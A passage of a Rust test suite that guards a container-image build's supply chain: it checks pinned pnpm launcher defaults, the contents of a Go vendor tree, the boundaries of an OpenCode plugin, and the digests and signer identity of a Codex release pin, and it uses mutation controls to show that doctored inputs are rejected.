        "the dsh graph must not carry a private pnpm"
    );
    assert!(
        !graph
            .snapshots
            .iter()
            .any(|entry| entry.key.starts_with("pnpm@")),
        "no dsh snapshot may be a pnpm identity"
    );
    assert!(!standard_dockerfile().contains("org.agent-vm.version.pnpm"));
    assert!(!standard_dockerfile().contains(".bin/pnpm /usr/local/bin/pnpm"));
    let launcher = read_text("images/pnpm/launcher.sh");
    assert!(launcher.starts_with("#!/bin/sh\nset -eu\n"));
    for (key, value) in [
        ("MINIMUM_RELEASE_AGE", "1440"),
        ("MINIMUM_RELEASE_AGE_STRICT", "true"),
        ("MINIMUM_RELEASE_AGE_IGNORE_MISSING_TIME", "false"),
        ("TRUST_POLICY", "no-downgrade"),
        ("IGNORE_SCRIPTS", "true"),
    ] {
        assert!(launcher.contains(&format!(": \"${{PNPM_CONFIG_{key}:={value}}}\"")));
        assert!(
            launcher
                .lines()
                .filter(|line| line.starts_with("export "))
                .any(|line| line
                    .split_whitespace()
                    .any(|word| word == format!("PNPM_CONFIG_{key}")))
        );
    }
    assert_eq!(launcher.matches(":=").count(), 5);
    assert!(launcher.contains("pnpm) exec /usr/bin/node /opt/agent-vm/pnpm/bin/pnpm.mjs \"$@\""));
    assert!(
        launcher.contains("pnx|pnpx) exec /usr/bin/node /opt/agent-vm/pnpm/bin/pnpx.mjs \"$@\"")
    );
    let bootstrap = read_text("images/pnpm/bootstrap.py");
    assert!(!bootstrap.contains("patch"));
    assert!(!bootstrap.contains("write_text"));
}

fn check_base_pnpm_sources(
    base: &str,
    standard: &str,
    launcher: &str,
    pin: &Value,
) -> Result<(), String> {
    let version = pin["version"].as_str().ok_or("missing base version")?;
    if base.matches("org.agent-vm.version.pnpm=").count() != 1
        || !base.contains(&format!("LABEL org.agent-vm.version.pnpm=\"{version}\""))
        || standard.contains("org.agent-vm.version.pnpm")
        || standard.contains(".bin/pnpm /usr/local/bin/pnpm")
    {
        return Err("pnpm selection/link ownership changed".into());
    }
    for recipe in [base, standard] {
        for command in [
            "/usr/bin/npm",
            "/usr/bin/npx",
            "/usr/local/bin/npm",
            "/usr/local/bin/npx",
        ] {
            if recipe.contains(command) {
                return Err("native npm/npx replacement".into());
            }
        }
    }
    for (key, value) in [
        ("MINIMUM_RELEASE_AGE", "1440"),
        ("MINIMUM_RELEASE_AGE_STRICT", "true"),
        ("MINIMUM_RELEASE_AGE_IGNORE_MISSING_TIME", "false"),
        ("TRUST_POLICY", "no-downgrade"),
        ("IGNORE_SCRIPTS", "true"),
    ] {
        if !launcher.contains(&format!(": \"${{PNPM_CONFIG_{key}:={value}}}\""))
            || !launcher
                .lines()
                .filter(|line| line.starts_with("export "))
                .any(|line| {
                    line.split_whitespace()
                        .any(|word| word == format!("PNPM_CONFIG_{key}"))
                })
        {
            return Err(format!("missing caller-preserving default/export: {key}"));
        }
    }
    if !launcher.contains("pnx|pnpx) exec /usr/bin/node /opt/agent-vm/pnpm/bin/pnpx.mjs \"$@\"") {
        return Err("alias dispatch changed".into());
    }
    if pin["sha512"]
        != "4463f65fd80ed80d69bc1d4bf163ee94f605c7380fc318bb5b2ebe15f8cd12d49c51a4d59e951b401e764d3b6ca751cbf51bc50ed7001a6bcb4935e684c34882"
        || pin["bundleSha256"] != "e8abc02d5fbffb8f9d8817d44d6eee84c379ea8d5006dd5aa8694bb5e4428d8a"
    {
        return Err("reviewed digests changed".into());
    }
    Ok(())
}

#[test]
fn base_pnpm_source_mutations_are_rejected() {
    let base = read_text("images/Dockerfile");
    let standard = standard_dockerfile();
    let launcher = read_text("images/pnpm/launcher.sh");
    let pin = read_json("images/pnpm/pin.json");
    assert!(check_base_pnpm_sources(&base, &standard, &launcher, &pin).is_ok());
    for mutated in [
        launcher.replace("export PNPM_CONFIG_IGNORE_SCRIPTS", "# omitted export"),
        launcher.replace(
            ": \"${PNPM_CONFIG_IGNORE_SCRIPTS:=true}\"",
            "PNPM_CONFIG_IGNORE_SCRIPTS=true",
        ),
        launcher.replace(
            ": \"${PNPM_CONFIG_MINIMUM_RELEASE_AGE:=1440}\"",
            "PNPM_CONFIG_MINIMUM_RELEASE_AGE=1440",
        ),
        launcher.replace(
            "pnx|pnpx) exec /usr/bin/node /opt/agent-vm/pnpm/bin/pnpx.mjs",
            "pnx|pnpx) exec /usr/bin/node /opt/agent-vm/pnpm/bin/pnpm.mjs",
        ),
    ] {
        assert!(check_base_pnpm_sources(&base, &standard, &mutated, &pin).is_err());
    }
    for addition in [
        "\nLABEL org.agent-vm.version.pnpm=\"11.11.0\"",
        "\nRUN ln -s /opt/agent-vm/dsh/node_modules/.bin/pnpm /usr/local/bin/pnpm",
        "\nRUN ln -s /usr/local/bin/pnpm /usr/bin/npm",
        "\nRUN ln -s /usr/local/bin/pnx /usr/bin/npx",
    ] {
        assert!(
            check_base_pnpm_sources(&base, &(standard.clone() + addition), &launcher, &pin)
                .is_err()
        );
    }
    assert!(
        check_base_pnpm_sources(
            &base.replace("pnpm=\"11.11.0\"", "pnpm=\"11.12.0\""),
            &standard,
            &launcher,
            &pin
        )
        .is_err()
    );
    for key in ["version", "sha512", "bundleSha256"] {
        let mut mutated = pin.clone();
        mutated[key] = Value::String("mutated".into());
        assert!(check_base_pnpm_sources(&base, &standard, &launcher, &mutated).is_err());
    }
}

#[test]
fn opencode_pnpm_inputs_are_pinned_bytes() {
    use serde_json::json;
    let manifest = read_json("images/tools/opencode/plugins/package.json");
    let sdk = "@anthropic-ai/claude-agent-sdk";
    let plugin = "@openchamber/opencode-claude";
    let version = manifest["dependencies"][plugin].as_str().unwrap();
    assert!(is_exact_semver(version));
    assert_eq!(
        manifest,
        json!({"name":"agent-vm-guest-opencode-plugins", "version":"0.0.0", "private":true,
            "type":"module", "packageManager":"pnpm@11.11.0", "dependencies":{sdk:"0.3.281",plugin:version}})
    );
    // OpenCode keeps three reviewed byte inputs and never adopts the shared
    // graph parser. Its digests are checked by explicit Node/Python suites, so
    // Rust owns only its inventory/path/source boundaries; the dsh graph guards
    // are the ones that run the shared CLI as a syntax adapter.
    let mut names = Vec::new();
    for line in read_text("images/tools/opencode/plugins/pnpm-inputs.sha256").lines() {
        let (digest, name) = line
            .split_once("  ")
            .unwrap_or_else(|| panic!("pin line is not '<digest>  <name>': {line:?}"));
        assert_eq!(line.split("  ").count(), 2, "{line:?}");
        assert_eq!(digest.len(), 64, "{line:?}");
        assert!(
            digest
                .chars()
                .all(|c| c.is_ascii_digit() || ('a'..='f').contains(&c)),
            "{line:?}"
        );
        names.push(name.to_string());
    }
    names.sort();
    assert_eq!(
        names,
        ["package.json", "pnpm-lock.yaml", "pnpm-workspace.yaml"]
    );
    for file in ["package.json", "pnpm-lock.yaml", "pnpm-workspace.yaml"] {
        assert!(
            repo_path(&format!("images/tools/opencode/plugins/{file}")).is_file(),
            "missing {file}"
        );
    }
    check_go_vendor_inventory();
    for file in [
        "images/tools/opencode/plugins/check-lock.mjs",
        "images/tools/opencode/plugins/pin-pnpm-inputs.mjs",
        "images/tools/opencode/plugins/prepare-lock.sh",
        "images/tools/opencode/plugins/upgrade-plugins.sh",
        "images/tools/opencode/install-opencode-plugins.sh",
    ] {
        assert!(
            check_opencode_parser_boundary(&read_text(file)).is_ok(),
            "{file}"
        );
    }
    let dockerfile = standard_dockerfile();
    assert_eq!(
        dockerfile_arg(&dockerfile, "AGENT_VERSION_OPENCODE_CLAUDE"),
        ""
    );
    assert_eq!(
        label_value(&dockerfile, "org.agent-vm.version.opencode-claude"),
        format!("${{AGENT_VERSION_OPENCODE_CLAUDE:-{version}}}")
    );
    assert!(dockerfile.contains(
        "COPY tools/opencode/plugins/pnpm-inputs.sha256 /opt/agent-vm/opencode-plugins/pnpm-inputs.sha256"
    ));
    assert!(
        !dockerfile.contains("pin-pnpm-inputs.mjs"),
        "the developer-only re-pin tool must not be copied into an image"
    );
    let pnpm = read_json("images/pnpm/pin.json");
    assert_eq!(
        manifest["packageManager"],
        format!("pnpm@{}", pnpm["version"].as_str().unwrap())
    );
    let install = read_text("images/tools/opencode/install-opencode-plugins.sh");
    for required in [
        "/usr/local/bin/pnpm",
        "--frozen-lockfile --prod --no-optional",
        "--ignore-scripts --ignore-pnpmfile --pm-on-fail=error",
        "--package-import-method=copy",
        "run-pnpm.sh",
        "recipe-contract\" pnpm-environment",
    ] {
        assert!(install.contains(required), "missing {required}");
    }
    for forbidden in [
        "npm ci",
        "npm install",
        "pnx",
        "corepack",
        "trust-lockfile",
        "trust-policy=off",
    ] {
        assert!(!install.contains(forbidden), "forbidden {forbidden}");
    }
    for file in [
        "images/tools/opencode/opencode.json",
        "images/tools/opencode/probe-opencode.py",
        "images/tools/opencode/check-claude-runtime.mjs",
        "images/tools/opencode/verify-opencode-plugins.sh",
        "images/recipe-contract/run-pnpm.sh",
        "images/tools/opencode/plugins/pnpm-inputs.sha256",
        "images/tools/opencode/plugins/pin-pnpm-inputs.mjs",
    ] {
        assert!(repo_path(file).is_file(), "missing {file}");
    }
}

fn check_opencode_parser_boundary(source: &str) -> Result<(), String> {
    // `pnpm-lock.yaml` file names stay legal; the helper's own spellings do not.
    for forbidden in [
        "pnpm-lock.mjs",
        "vendor/yaml",
        "'pnpm-lock'",
        "\"pnpm-lock\"",
        "pnpm-yaml",
        "go.yaml.in",
    ] {
        if source.contains(forbidden) {
            return Err(format!("OpenCode must not adopt {forbidden}"));
        }
    }
    Ok(())
}

/// The exact vendor closure: `modules.txt` plus the pinned module's files.
const VENDOR_MODULE_FILES: [&str; 16] = [
    "apic.go",
    "decode.go",
    "emitterc.go",
    "encode.go",
    "LICENSE",
    "NOTICE",
    "parserc.go",
    "readerc.go",
    "README.md",
    "resolve.go",
    "scannerc.go",
    "sorter.go",
    "writerc.go",
    "yaml.go",
    "yamlh.go",
    "yamlprivateh.go",
];

const VENDOR_MODULES_TXT: &str =
    "# go.yaml.in/yaml/v3 v3.0.5\n## explicit; go 1.16\ngo.yaml.in/yaml/v3\n";

const VENDOR_GO_SUM: &str = "go.yaml.in/yaml/v3 v3.0.5 h1:N6y/pJk8buWs9NY5ERU2HSMfm+IuD/OtfdAnq6kESPw=\ngo.yaml.in/yaml/v3 v3.0.5/go.mod h1:HVTZu1O7/Vkt2N+BFy8Zza+lnLsABggaTM2ZpNIGuKg=\n";

/// The vendor tree is the whole dependency closure, so its file set, its module
/// list, its checksum pin and its single importing package are the provenance
/// evidence. Each check is a pure function over text or paths so a mutation
/// control can prove the gate rejects a doctored input.
fn check_vendor_file_set(paths: &std::collections::BTreeSet<String>) -> Result<(), String> {
    let mut expected = std::collections::BTreeSet::new();
    expected.insert("modules.txt".to_string());
    for file in VENDOR_MODULE_FILES {
        expected.insert(format!("go.yaml.in/yaml/v3/{file}"));
    }
    if paths != &expected {
        return Err(format!(
            "vendor closure differs: missing {:?}, extra {:?}",
            expected.difference(paths).collect::<Vec<_>>(),
            paths.difference(&expected).collect::<Vec<_>>()
        ));
    }
    Ok(())
}

fn check_go_sum(text: &str) -> Result<(), String> {
    if text != VENDOR_GO_SUM {
        return Err("go.sum does not name exactly the reviewed pin".into());
    }
    Ok(())
}

fn check_go_mod(text: &str) -> Result<(), String> {
    let requires: Vec<&str> = text
        .lines()
        .filter(|line| line.trim_start().starts_with("require "))
        .collect();
    if requires != vec!["require go.yaml.in/yaml/v3 v3.0.5"] {
        return Err(format!(
            "go.mod requires exactly one pinned module: {requires:?}"
        ));
    }
    Ok(())
}

fn check_go_vendor_inventory() {
    use std::collections::BTreeSet;
    let vendor = repo_path("images/recipe-contract/vendor");
    fn inventory(root: &Path, directory: &Path, paths: &mut BTreeSet<String>) {
        for entry in std::fs::read_dir(directory).unwrap() {
            let entry = entry.unwrap();
            let file_type = entry.file_type().unwrap();
            assert!(!file_type.is_symlink(), "vendor symlink substitution");
            if file_type.is_dir() {
                inventory(root, &entry.path(), paths);
            } else {
                assert!(file_type.is_file());
                paths.insert(
                    entry
                        .path()
                        .strip_prefix(root)
                        .unwrap()
                        .to_str()
                        .unwrap()
                        .to_string(),
                );
            }
        }
    }
    let mut actual = BTreeSet::new();
    inventory(&vendor, &vendor, &mut actual);
    assert_eq!(check_vendor_file_set(&actual), Ok(()));
    assert_eq!(
        read_text("images/recipe-contract/vendor/modules.txt"),
        VENDOR_MODULES_TXT
    );
    assert_eq!(
        check_go_sum(&read_text("images/recipe-contract/go.sum")),
        Ok(())
    );
    assert_eq!(
        check_go_mod(&read_text("images/recipe-contract/go.mod")),
        Ok(())
    );
    // Parse import metadata with Go: aliases, escaped and raw strings are all legal.
    let imports = std::process::Command::new("go")
        .args([
            "test",
            "-mod=vendor",
            "-count=1",
            "-run",
            "TestYAMLImport",
            "./internal/buildcheck",
        ])
        .current_dir(repo_path("images/recipe-contract"))
        .output()
        .expect("run Go import boundary guard");
    assert!(
        imports.status.success(),
        "Go import boundary: {}{}",
        String::from_utf8_lossy(&imports.stdout),
        String::from_utf8_lossy(&imports.stderr)
    );

    // Mutation controls: each gate must reject a doctored input.
    let mut extra = actual.clone();
    extra.insert("yaml/dist/index.js".to_string());
    assert!(check_vendor_file_set(&extra).is_err());
    assert!(
        check_go_sum(&format!(
            "{VENDOR_GO_SUM}go.yaml.in/yaml/v3 v3.0.5 h1:other=\n"
        ))
        .is_err()
    );
    assert!(
        check_go_mod("module x\n\nrequire (\n\tgo.yaml.in/yaml/v3 v3.0.5\n\tother v1.0.0\n)\n")
            .is_err()
    );
    assert!(check_go_mod("module x\n").is_err());

    for file in [
        "images/recipe-contract/pnpmlock/compare.go",
        "images/recipe-contract/internal/document/yaml.go",
        "script/test/pnpm-lock-inputs.mjs",
        "script/test/recipe-contract-vendor.sh",
    ] {
        assert!(repo_path(file).is_file(), "missing primitive {file}");
    }
    for retired in [
        "images/recipe-contract/pnpm-lock.mjs",
        "images/recipe-contract/check-pnpm-environment.mjs",
        "images/recipe-contract/vendor/yaml",
        "images/tools/dsh/check-lock-update.js",
        "images/tools/dsh/derive-cordis-overrides.mjs",
        "images/tools/dsh/upgrade-project.mjs",
        "script/test/pnpm-vendor.mjs",
        "script/test/fixtures/dsh/read-workspace.mjs",
    ] {
        assert!(
            !repo_path(retired).exists(),
            "retired file is back: {retired}"
        );
    }
    for recipe in ["images/Dockerfile", "images/standard/Dockerfile"] {
        let text = read_text(recipe);
        // The single deliberate builder-stage COPY compiles the helper; it never
        // appears in the product stage.
        let product = product_stage(&text);
        assert_eq!(
            product.matches("COPY recipe-contract/").count(),
            0,
            "the product stage must not COPY the helper directory"
        );
        for line in product.lines() {
            if line.trim_start().starts_with("COPY ") || line.trim_start().starts_with("ADD ") {
                assert!(
                    !line.contains("recipe-contract"),
                    "build helpers must not become runtime payloads"
                );
                for forbidden in ["pnpm-lock.mjs", "vendor/yaml", "vendor/", "pnpmlock"] {
                    assert!(
                        !line.contains(forbidden),
                        "the product stage must not COPY {forbidden}"
                    );
                }
            }
        }
    }
}

#[test]
fn opencode_rejects_parser_adoption_mutations() {
    let checker = read_text("images/tools/opencode/plugins/check-lock.mjs");
    assert!(check_opencode_parser_boundary(&checker).is_ok());
    for import in [
        "import './pnpm-lock.mjs';",
        "import YAML from '../../../recipe-contract/vendor/yaml/dist/index.js';",
        "const { spawnSync } = require('node:child_process');\nspawnSync(binary, ['pnpm-lock', 'graph', 'dsh', prefix]);",
        "const { spawnSync } = require('node:child_process');\nspawnSync(binary, [\"pnpm-yaml\", file]);",
        "import 'go.yaml.in/yaml/v3';",
    ] {
        assert!(check_opencode_parser_boundary(&format!("{checker}\n{import}")).is_err());
    }
}

#[test]
fn helper_scan_comments_preserve_shell_expansions() {
    for line in [
        "echo $#",
        "echo ${x#prefix}",
        "echo ${x##prefix}",
        "echo 'a#b'",
    ] {
        assert_eq!(strip_comment(line), line);
    }
    assert_eq!(strip_comment("echo $# # comment"), "echo $# ");
}

#[test]
fn go_dev_mirrors_the_module_lint_pin() {
    let pin = read_text("images/recipe-contract/golangci-lint.version");
    let declaration = format!("ARG GOLANGCI_LINT_VERSION={}", pin.trim());
    let dockerfile = read_text("examples/layers/go-dev/Dockerfile");
    assert_eq!(
        dockerfile
            .lines()
            .filter(|line| line.starts_with("ARG GOLANGCI_LINT_VERSION="))
            .collect::<Vec<_>>(),
        vec![declaration.as_str()]
    );
    let verification = read_text("examples/layers/go-dev/verify-toolchain.sh");
    assert!(verification.contains("golangci-lint has version ${GOLANGCI_LINT_VERSION} "));
}

// --- committed Codex payload closure (#97) -----------------------------------
//
// `images/tools/codex/pin.json` is the reviewed selection of one exact Codex
// release: two Linux package payloads with exact URLs and SHA-256 digests, the
// original release metadata, the original `codex-package_SHA256SUMS` and both
// original legacy `.sigstore` bundles, plus the signer policy that was enforced
// when the pin was made. The loader (`images/tools/codex/codex_pin.py`) is what
// ordinary builds run; this gate re-derives the identity independently from the
// pin instead of trusting the loader, and checks that the recipe is wired to a
// read-only committed source rather than to anything live.
//
// What it cannot re-derive is a hash: no SHA-256 implementation lives in this
// crate, so evidence bytes are bound by the Python loader and by the
// `--write-fixture`/`--check` suites, not here.

const CODEX_PIN: &str = "images/tools/codex/pin.json";
const CODEX_HOOK: &str = "images/tools/codex/install-codex.sh";
const CODEX_LOADER: &str = "images/tools/codex/codex_pin.py";
const CODEX_SOURCE_MOUNT: &str = "--mount=type=bind,source=tools/codex,target=/tmp/codex-source,ro";
const CODEX_SOURCE_ENV: &str = "AGENT_VM_CODEX_SOURCE_DIR=/tmp/codex-source";
const CODEX_VENDOR_MOUNT: &str =
    "--mount=type=bind,source=tools/codex/vendor,target=/opt/agent-vm/recipe-vendor,ro";
const CODEX_HOOK_MOUNT: &str =
    "--mount=type=bind,source=tools/codex/install-codex.sh,target=/tmp/install-codex.sh,ro";
const CODEX_RUN_INSTALL: &str = "sh /tmp/recipe-contract/run-install.sh codex /opt/agent-vm/install-status/codex sh /tmp/install-codex.sh";
const CODEX_VERIFIER_VERSION: &str = "v2.4.1";
const CODEX_TRUST_ROOT: &str = "sigstore-production-tuf";
const CODEX_ISSUER: &str = "https://token.actions.githubusercontent.com";
const CODEX_WORKFLOW: &str = "https://github.com/openai/codex/.github/workflows/rust-release.yml";
const CODEX_CHECKSUMS_ASSET: &str = "codex-package_SHA256SUMS";
const CODEX_METADATA_PATH: &str = "evidence/release.json";
const CODEX_CHECKSUMS_PATH: &str = "evidence/codex-package_SHA256SUMS";
const CODEX_NAME: &str = "codex";
const CODEX_KIND: &str = "codex-standalone-package";
const CODEX_AUTHENTICATION_METHOD: &str = "sigstore-blob-pin-time";
const CODEX_ENTRYPOINT: &str = "bin/codex";
const CODEX_TARGETS: [(&str, &str); 2] = [
    ("linux/amd64", "x86_64-unknown-linux-musl"),
    ("linux/arm64", "aarch64-unknown-linux-musl"),
];

#[derive(Clone, Debug, PartialEq, Eq)]
struct CodexEvidence {
    url: String,
    path: String,
    digest: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct CodexPlatformPin {
    target: String,
    asset: String,
    url: String,
    digest: String,
    bundle: CodexEvidence,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct CodexAuthentication {
    verifier_version: String,
    trust_root: String,
    identity: String,
    issuer: String,
    verified_on: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct CodexPin {
    release: String,
    version: String,
    metadata: CodexEvidence,
    checksums: CodexEvidence,
    platforms: BTreeMap<String, CodexPlatformPin>,
    authentication: CodexAuthentication,
}

fn codex_hex(value: &Value, context: &str) -> Result<String, String> {
    let raw = text(value, context)?;
    if is_lower_hex(&raw, 64) {
        Ok(raw)
    } else {
        Err(format!("{context}: 64 lower-case hex characters required"))
    }
}

fn is_codex_version(value: &str) -> bool {
    let (core, suffix) = match value.split_once('-') {
        Some((core, suffix)) => (core, suffix),
        None => (value, ""),
    };
    if !is_exact_version(core) {
        return false;
    }
    if suffix.is_empty() {
        return true;
    }
    let mut parts = suffix.split('.');
    let channel = parts.next().unwrap_or_default();
    let identifiers: Vec<&str> = parts.collect();
    if identifiers.iter().any(|part| {
        part.is_empty()
            || !part.bytes().all(|byte| byte.is_ascii_digit())
            || (*part != "0" && part.starts_with('0'))
    }) {
        return false;
    }
    match channel {
        "alpha" if identifiers.len() <= 2 => true,
        "beta" if identifiers.len() <= 1 => true,
        _ => false,
    }
}

fn codex_api_url(release: &str) -> String {
    format!("https://api.github.com/repos/openai/codex/releases/tags/{release}")
}

fn codex_asset_url(release: &str, asset: &str) -> String {
    format!("https://github.com/openai/codex/releases/download/{release}/{asset}")
}

fn codex_asset_name(target: &str) -> String {
    format!("codex-package-{target}.tar.gz")
}

fn codex_bundle_name(target: &str) -> String {
    format!("codex-package-{target}.tar.gz.sigstore")
}

fn parse_codex_evidence(
    value: &Value,
    url: String,
    path: &str,
    context: &str,
) -> Result<CodexEvidence, String> {
    let members = exact(value, &["url", "path", "sha256"], context)?;
    let found_url = text(&members["url"], &format!("{context} url"))?;
    if found_url != url {
        return Err(format!("{context} url must be {url}, found {found_url}"));
    }
    let found_path = text(&members["path"], &format!("{context} path"))?;
    if found_path != path {
        return Err(format!("{context} path must be {path}, found {found_path}"));
    }
    Ok(CodexEvidence {
        url: found_url,
        path: found_path,
        digest: codex_hex(&members["sha256"], &format!("{context} sha256"))?,
    })
}

fn parse_codex_pin(source: &str) -> Result<CodexPin, String> {
    let document = strict_json(source)?;
    let members = exact(
        &document,
        &[
            "schema",
            "name",
            "kind",
            "release",
            "version",
            "package",
            "metadata",
            "checksums",
            "platforms",
            "authentication",
        ],
        "codex pin",
    )?;
    if members["schema"].as_u64() != Some(1) || members["schema"].as_i64() != Some(1) {
        return Err("codex pin: schema must be the integer 1".into());
    }
    let name = text(&members["name"], "codex pin name")?;
    if name != CODEX_NAME || members["name"].as_bool().is_some() {
        return Err(format!("codex pin: name must be {CODEX_NAME}"));
    }
    let kind = text(&members["kind"], "codex pin kind")?;
    if kind != CODEX_KIND {
        return Err(format!("codex pin: kind must be {CODEX_KIND}"));
    }
    let release = text(&members["release"], "codex pin release")?;
    if !release.starts_with("rust-v") {
        return Err(format!(
            "codex pin: release must be rust-v<version>, found {release}"
        ));
    }
    let version = text(&members["version"], "codex pin version")?;
    if !is_codex_version(&version) {
        return Err(format!(
            "codex pin: version is not an exact Codex version: {version}"
        ));
    }
    if release != format!("rust-v{version}") {
        return Err(format!(
            "codex pin: release {release} does not spell version {version}"
        ));
    }
    let package = exact(
        &members["package"],
        &["layout_version", "variant", "entrypoint"],
        "codex package",
    )?;
    if package["layout_version"].as_i64() != Some(1) {
        return Err("codex pin: package layout_version must be the integer 1".into());
    }
    let variant = text(&package["variant"], "codex package variant")?;
    if variant != CODEX_NAME {
        return Err(format!("codex pin: package variant must be {CODEX_NAME}"));
    }
    let entrypoint = text(&package["entrypoint"], "codex package entrypoint")?;
    if entrypoint != CODEX_ENTRYPOINT {
        return Err(format!(
            "codex pin: package entrypoint must be {CODEX_ENTRYPOINT}"
        ));
    }
    let metadata = parse_codex_evidence(
        &members["metadata"],
        codex_api_url(&release),
        CODEX_METADATA_PATH,
        "codex metadata",
    )?;
    let checksums = parse_codex_evidence(
        &members["checksums"],
        codex_asset_url(&release, CODEX_CHECKSUMS_ASSET),
        CODEX_CHECKSUMS_PATH,
        "codex checksums",
    )?;
    let platform_members = exact_platforms(
        &members["platforms"],
        &["target", "asset", "url", "sha256", "bundle"],
        "codex platforms",
    )?;
    let mut platforms = BTreeMap::new();
    for ((platform, target), entry) in CODEX_TARGETS.iter().zip(platform_members) {
        let found_target = text(&entry["target"], &format!("codex {platform} target"))?;
        if found_target != *target {
            return Err(format!(
                "codex {platform}: target must be {target}, found {found_target}"
            ));
        }
        let asset = text(&entry["asset"], &format!("codex {platform} asset"))?;
        if asset != codex_asset_name(target) {
            return Err(format!(
                "codex {platform}: asset must be {}, found {asset}",
                codex_asset_name(target)
            ));
        }
        let url = text(&entry["url"], &format!("codex {platform} url"))?;
        if url != codex_asset_url(&release, &asset) {
            return Err(format!(
                "codex {platform}: url must be {}, found {url}",
                codex_asset_url(&release, &asset)
            ));
        }
        let bundle = parse_codex_evidence(
            &entry["bundle"],
            codex_asset_url(&release, &codex_bundle_name(target)),
            &format!("evidence/{}", codex_bundle_name(target)),
            &format!("codex {platform} bundle"),
        )?;
        platforms.insert(
            (*platform).to_string(),
            CodexPlatformPin {
                target: found_target,
                asset,
                url,
                digest: codex_hex(&entry["sha256"], &format!("codex {platform} sha256"))?,
                bundle,
            },
        );
    }
    let authentication = exact(
        &members["authentication"],
        &[
            "method",
            "verifier",
            "trust_root",
            "certificate_identity",
            "certificate_oidc_issuer",
            "verified_on",
        ],
        "codex authentication",
    )?;
    if text(&authentication["method"], "codex authentication method")?
        != CODEX_AUTHENTICATION_METHOD
    {
        return Err(format!(
            "codex authentication method must be {CODEX_AUTHENTICATION_METHOD}"
        ));
    }
    let verifier = exact(
        &authentication["verifier"],
        &["name", "version"],
        "codex authentication verifier",
    )?;
    if text(&verifier["name"], "codex verifier name")? != "cosign" {
        return Err("codex authentication verifier must be cosign".into());
    }
    let verifier_version = text(&verifier["version"], "codex verifier version")?;
    if verifier_version != CODEX_VERIFIER_VERSION {
        return Err(format!(
            "codex verifier version must be {CODEX_VERIFIER_VERSION}, found {verifier_version}"
        ));
    }
    let trust_root = text(&authentication["trust_root"], "codex trust_root")?;
    if trust_root != CODEX_TRUST_ROOT {
        return Err(format!(
            "codex trust_root must be {CODEX_TRUST_ROOT}, found {trust_root}"
        ));
    }
    let identity = text(
        &authentication["certificate_identity"],
        "codex certificate identity",
    )?;
    let expected_identity = format!("{CODEX_WORKFLOW}@refs/tags/{release}");
    if identity != expected_identity {
        return Err(format!(
            "codex certificate identity must be {expected_identity}, found {identity}"
        ));
    }
    let issuer = text(
        &authentication["certificate_oidc_issuer"],
        "codex certificate issuer",
    )?;
    if issuer != CODEX_ISSUER {
        return Err(format!(
            "codex OIDC issuer must be {CODEX_ISSUER}, found {issuer}"
        ));
    }
    let verified_on = text(&authentication["verified_on"], "codex verified_on")?;
    if !is_date(&verified_on) {
        return Err(format!(
            "codex verified_on must be YYYY-MM-DD, found {verified_on}"
        ));
    }
    Ok(CodexPin {
        release,
        version,
        metadata,
        checksums,
        platforms,
        authentication: CodexAuthentication {
            verifier_version,
            trust_root,
            identity,
            issuer,
            verified_on,
        },
    })
}

/// Replace `from` with `to` inside the codex RUN only, so a mutation cannot land
/// in an unrelated recipe block and quietly prove nothing.
fn mutate_codex_block(recipe: &str, from: &str, to: &str) -> String {
    let block = codex_run_block(recipe).expect("the codex RUN is discoverable");
    if !block.contains(from) {
        panic!("the codex RUN does not contain {from:?}");
    }
    recipe.replacen(block, &block.replacen(from, to, 1), 1)
}

/// The one RUN that installs codex, found from its own hook mount.
fn codex_run_block(recipe: &str) -> Result<&str, String> {
    let position = recipe
        .find(CODEX_HOOK_MOUNT)
        .ok_or("the codex hook mount is missing")?;
    let start = recipe[..position]
        .rfind("RUN ")
        .ok_or("the codex hook mount is not inside a RUN instruction")?;
    let end = recipe[position..]
        .find("\n\n")
        .map(|offset| position + offset)
        .unwrap_or(recipe.len());
    Ok(&recipe[start..end])
}

fn check_codex_recipe(recipe: &str, pin: &CodexPin) -> Result<(), String> {
    let argument = format!("ARG AGENT_VERSION_CODEX={}", pin.release);
    let declarations: Vec<&str> = recipe
        .lines()
        .filter(|line| line.starts_with("ARG AGENT_VERSION_CODEX="))
        .collect();
    if declarations != vec![argument.as_str()] {
        return Err(format!(
            "the recipe must declare exactly `{argument}`, found {declarations:?}"
        ));
    }
    let label = "LABEL org.agent-vm.version.codex=\"${AGENT_VERSION_CODEX}\"";
    if recipe.matches(label).count() != 1 {
        return Err(format!("the recipe must declare `{label}` exactly once"));
    }
    if recipe.matches(CODEX_SOURCE_MOUNT).count() != 1 {
        return Err(format!(
            "the codex source must be mounted read-only exactly once: {CODEX_SOURCE_MOUNT}"
        ));
    }
    let block = codex_run_block(recipe)?;
    for required in [
        CODEX_SOURCE_MOUNT,
        CODEX_SOURCE_ENV,
        CODEX_VENDOR_MOUNT,
        CODEX_HOOK_MOUNT,
        CODEX_RUN_INSTALL,
        "AGENT_VM_CONTRACT_DIR=/tmp/recipe-contract",
        "AGENT_VM_VERSION_CODEX=\"${AGENT_VERSION_CODEX}\"",
        "AGENT_VM_INSTALL_STATUS_DIR=/opt/agent-vm/install-status",
        "AGENT_INSTALL_SOFT_FAIL= \\",
    ] {
        if !block.contains(required) {
            return Err(format!("the codex RUN must contain `{required}`"));
        }
    }
    for forbidden in [
        "AGENT_VM_CODEX_DIGEST",
        "AGENT_VM_CODEX_URL",
        "AGENT_VM_CODEX_PIN",
        "CODEX_PIN_DIR=",
        "AGENT_VM_CODEX_EXPECTED",
        "latest",
    ] {
        if block.contains(forbidden) {
            return Err(format!(
                "the codex RUN must not accept or reach `{forbidden}`: the pin is the only input"
            ));
        }
    }
    if !recipe.contains("sh /tmp/verify-codex.sh") {
        return Err("the existing codex verifier must stay reachable".into());
    }
    // The source mount must never become writable.
    if recipe.matches("target=/tmp/codex-source").count()
        != recipe.matches(CODEX_SOURCE_MOUNT).count()
    {
        return Err("the codex source mount must be read-only".into());
    }
    Ok(())
}

/// Shell source with every comment removed, so a word in prose (for example the
/// history of a removed `latest` branch) is not mistaken for an executable path.
fn codex_code_lines(text: &str) -> String {
    text.lines()
        .map(strip_shell_comment)
        .collect::<Vec<&str>>()
        .join("\n")
}

fn check_codex_helper_sources(hook: &str, loader: &str) -> Result<(), String> {
    let hook_code = codex_code_lines(hook);
    for required in [
        "AGENT_VM_CODEX_SOURCE_DIR",
        "codex_pin.py",
        "check --pin-dir",
        "CODEX_PIN_DIR",
        "CODEX_INSTALL_DIR",
        "CODEX_INSTALL_DAEMON_ONLY=0",
